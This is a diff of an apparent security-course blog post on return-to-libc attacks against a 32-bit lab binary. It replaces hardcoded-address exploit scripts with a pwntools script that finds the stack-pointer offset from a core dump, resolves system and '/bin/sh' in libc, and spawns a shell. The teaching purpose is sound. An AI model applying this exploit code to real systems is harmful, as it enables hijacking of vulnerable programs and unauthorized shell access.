@@ -6,6 +6,7 @@ layout: post
 challenges: heap1 heap2 heap3 stack4 stack5 stack6
 ---
 
+**Updated April 9, 2020 to include a different soluton for the vuln binary.**
 
 Up until now we've been focusing on a specific class of attacks: **code
 injection**. In these attacks, the attacker injects their own code into a
@@ -161,89 +162,97 @@ End of assembler dump.
 ```
 
 The added complication here is that our compiler inserted some instructions
-(from `*main+0 to +7`) to properly align the stack and this complicates our
-exploit; note, we could avoid this problem if we had compiled with the flag
-`-mpreferred-stack-boundary=2`.  Before the return instruction the prologue
-sets the stack pointer based on a value saved inside the current stack frame.
-As a result, we aren't going to overwrite the saved return address, instead, we
-are going to manipulate the value used to set the stack pointer, e.g.,
-instructions `*main+37 to +44`.
+(from `*main+0 to +7`) to properly align the stack and save the previous
+location of the stack pointer. This code slightly complicates our exploit. We
+aren't going to overwrite the saved return address, instead, we are going to
+manipulate the value used to set the stack pointer, e.g., instructions
+`*main+37 to +44`. Note, if we had complied with the flag
+`-mpreferred-stack-boundary=2` then we could have targeted the saved return
+address directly.  
 
-By placing break points in gdb, we can get the starting address of the
-vulnerable buffer (`b *main+24`) and the location used to set the stack pointer
-(`b *main+33`). We want to modify the value at the saved stack pointer location
-to that the stack pointer will instead point to the start of our vulnerable
-buffer. This will allow us to control the return address used by the  `ret` 
-instruction. We want this return address to be `system`.
+Our attack will work as follows:
+ 1. Figure out the offset from the vulnerable buffer to the saved stack pointer.  
+ 2. Figure out the addresses of our environment variable, `system`, and the
+    `/bin/sh` string. 
+ 3. Setup our environment variable with the needed stack layout.  
+ 4. Send the exploit string that will cause `esp` to point to our environment variable.  
 
-```python
-# file: exploit32a.py
-# output: e32a.in
+**Step 1. Finding the Offset.** By sending a long cyclic string, we can use
+information from the resulting core dump to find the offset from the start of
+the vulnerable buffer to the saved stack pointer. In particular, we want to
+examine the value in register `ecx` as that register is used in `*main+41` to
+set the stack pointer. *Potential gotcha:* Note that if you used the fault
+address given in the core you will get the wrong offset due to subtraction of
+`0x4` from `ecx`.  
 
-import struct
-import sys
 
-buff_addr = 0xffffc720 
-weird_addr = 0xffffc768-4
+**Step 2. Finding useful addresses.** We can use the corefile directly to find
+the address of the `WIN` environment variable. To find the address of `system`
+and the `/bin/sh` string in libc, we are going to get the offsets directly from
+the libc shared object file and add that to the runtime address of libc given
+by corefile.   Note that we could pass an arbitrary string to `system` by
+placing that string on the stack in our vulnerable buffer or throwing it in an
+environment variable; however, the "/bin/sh" string already exists in the libc
+code and its address tends to be more predictable than stack addresses.
 
-padding_len = weird_addr - buff_addr
-padding = 'a'*padding_len
+**Step 3. Setting up the environment variable.** It is not enough to manipulate
+the stack pointer to point at a location we control. We also need to make sure
+that the new top of the stack is setup how system function is expecting. In
+other words, we want to setup the appropriate arguments in our environment
+variable. The notes in the previous section explain what this setup should look
+like.  
 
-sys.stdout.write(padding + struct.pack("<I", buff_addr + 4) )
-```
-
-It is not enough to manipulate the stack pointer to point to point at a
-location we control (i.e., the vulnerable buffer). We also need to make sure
-that the new top of the stack is setup how system function is expecting (e.g.,
-with the appropriate arguments).
-
-The address of system is easy to find with a gdb command: `x system`, and the
-dummy return address can be anything. But how do we get setup the command
-argument? Specifically, we need the address of useful command string. We could
-include such a string on the stack, either by putting in our vulnerable buffer
-or throwing it in an environment variable, but we are going to take a different
-approach that uses a string at an address that is easier to predict. Specifically, 
-we want to find an existing string in libc; turn out the string "/bin/sh"
-already exists in the libc code.
-
-**Finding the "/bin/sh" string in libc.** First we find what version of libc is
-loaded, where it is loaded in memory, and where the .SO file is on disk using
-`info proc map`. Now we can search (outside of gdb) for the "/bin/sh" string in
-the .SO file with `strings -a -tx /lib/i386-linux-gnu/libc-2.23.so | grep
-/bin/sh`. We can add the offset of this string in the .SO file to the address
-of libc in the process to get the actual address of the string.
+**Step 4. Manipuate the stack pointer.** Finally, we want to modify the saved
+stack pointer location so that it will instead point to our environment
+variable. This manipulation will allow us to control the return address used by
+the  `ret` instruction. We want our environment variable `WIN` to become the
+new top of the stack so that the new return address will be `system`. 
 
 Putting it all together we have our full attack:
 
 ```python
-
-# file: exploit32b.py
-# output: e32b.in
-# Note: the actual stack addresses may change, so make sure to check the
-# values
+# file: exploit.py
 
 import struct
 import sys
 
-buff_addr = 0xffffc790 
-weird_addr = 0xffffc7d8-4
+from pwn import *
 
-system_addr = 0xf7e4eda0
+context.clear(arch='i386')
+
+p = process('./vuln', env={'WIN':'Put ROP here'})
+
+p.sendline(cyclic(128))
+p.wait()
+
+assert pack(p.corefile.ecx) in cyclic(128)
+
+offset = cyclic_find(pack(p.corefile.ecx))
+
+print "Offset: ", offset 
+print "WIN addr: ", hex(p.corefile.env['WIN'])
+
+libc = ELF(p.corefile.libc.path)
+
+system_addr = libc.symbols.system + p.corefile.libc.start  
 dummy_ret = 'aaaa'
-libc_addr = 0xf7e14000
-command_addr = libc_addr + 0x15ba0b
+binsh_str_addr = p.corefile.libc.find('/bin/sh') 
 
-payload = struct.pack("<I", system_addr) + dummy_ret + struct.pack("<I", libc_addr)
+exploit_str = flat({offset:pack(p.corefile.env['WIN']+4)})
+   
+env_str = flat( 
+    pack(system_addr), 
+    dummy_ret, 
+    pack(binsh_str_addr) 
+    )
 
+with open('input.txt', 'wb') as f:
+    f.write(exploit_str)
 
-padding_len = weird_addr - buff_addr - len(payload)
-padding = 'a'*padding_len
+p = process('./vuln', env = {'WIN':env_str})
 
-
-sys.stdout.write(payload + padding + struct.pack("<I", buff_addr + 4) )
-sys.stdout.write('\n')
-#This command should be executed by our newly popped shell.
-sys.stdout.write('echo peanut')
+p.sendline(exploit_str)
+p.interactive()
 
 ```
 
